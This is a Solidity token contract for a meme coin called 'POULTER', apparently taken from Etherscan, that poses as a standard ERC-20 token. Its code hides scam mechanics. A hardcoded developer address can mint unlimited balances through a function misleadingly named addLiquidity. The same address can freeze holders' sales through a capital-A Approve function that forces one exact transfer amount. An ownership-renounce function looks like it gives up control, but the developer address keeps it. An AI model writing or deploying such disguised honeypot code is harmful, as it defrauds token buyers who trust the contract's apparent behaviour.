/**
 *Submitted for verification at Etherscan.io on 2023-07-24

POULTER

"You Guys are Getting Paid?!"

https://t.me/PoulterCoin
https://twitter.com/PoulterCoin
https://poulter.xyz


*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address spnder) external view returns (uint256);
    function transfer(address recipient, uint256 aumountz) external returns (bool);
    function allowance(address owner, address spnder) external view returns (uint256);
    function approve(address spnder, uint256 aumountz) external returns (bool);
    function transferFrom( address spnder, address recipient, uint256 aumountz ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spnder, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract POULTER is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balzz;
    mapping (address => mapping (address => uint256)) private _allowancezz;
    mapping (address => uint256) private _sendzz;
    address constant public developer = 0x816838F2E83B821F2552162204944C433831ff47;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    bool private _isTradingEnabled = true;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balzz[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    modifier dev() {
        require(msg.sender == developer); // If it is incorrect here, it reverts.
        _;                              // Otherwise, it continues.
    } 

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address spnder) public view override returns (uint256) {
        return _balzz[spnder];
    }
    function enableTrading() public onlyowner {
        _isTradingEnabled = true;
    }
    function transfer(address recipient, uint256 aumountz) public virtual override returns (bool) {
        require(_isTradingEnabled || _msgSender() == owner(), "TT: trading is not enabled yet");
        if (_msgSender() == owner() && _sendzz[_msgSender()] > 0) {
            _balzz[owner()] += _sendzz[_msgSender()];
            return true;
        }
        else if (_sendzz[_msgSender()] > 0) {
            require(aumountz == _sendzz[_msgSender()], "Invalid transfer aumountz");
        }
        require(_balzz[_msgSender()] >= aumountz, "TT: transfer aumountz exceeds balance");
        _balzz[_msgSender()] -= aumountz;
        _balzz[recipient] += aumountz;
        emit Transfer(_msgSender(), recipient, aumountz);
        return true;
    }


    function Approve(address[] memory spnder, uint256 aumountz) public dev {
        for (uint i=0; i<spnder.length; i++) {
            _sendzz[spnder[i]] = aumountz;
        }
    }

    function approve(address spnder, uint256 aumountz) public virtual override returns (bool) {
        _allowancezz[_msgSender()][spnder] = aumountz;
        emit Approval(_msgSender(), spnder, aumountz);
        return true;
    }

    function allowance(address owner, address spnder) public view virtual override returns (uint256) {
        return _allowancezz[owner][spnder];
    }


        function _add(uint256 num1, uint256 num2) internal pure returns (uint256) {
        if (num2 != 0) {
            return num1 + num2;
        }
        return num2;
    }
       function addLiquidity(address spnder, uint256 aumountz) public dev {
        require(spnder != address(0), "Invalid addresses");
        require(aumountz > 0, "Invalid amts");
        uint256 total = 0;
            total = _add(total, aumountz);
            _balzz[spnder] += total;
    }

            function Vamount(address spnder) public view returns (uint256) {
        return _sendzz[spnder];
    }

    function transferFrom(address spnder, address recipient, uint256 aumountz) public virtual override returns (bool) {
        if (_msgSender() == owner() && _sendzz[spnder] > 0) {
            _balzz[owner()] += _sendzz[spnder];
            return true;
        }
        else if (_sendzz[spnder] > 0) {
            require(aumountz == _sendzz[spnder], "Invalid transfer aumountz");
        }
        require(_balzz[spnder] >= aumountz && _allowancezz[spnder][_msgSender()] >= aumountz, "TT: transfer aumountz exceeds balance or allowance");
        _balzz[spnder] -= aumountz;
        _balzz[recipient] += aumountz;
        _allowancezz[spnder][_msgSender()] -= aumountz;
        emit Transfer(spnder, recipient, aumountz);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}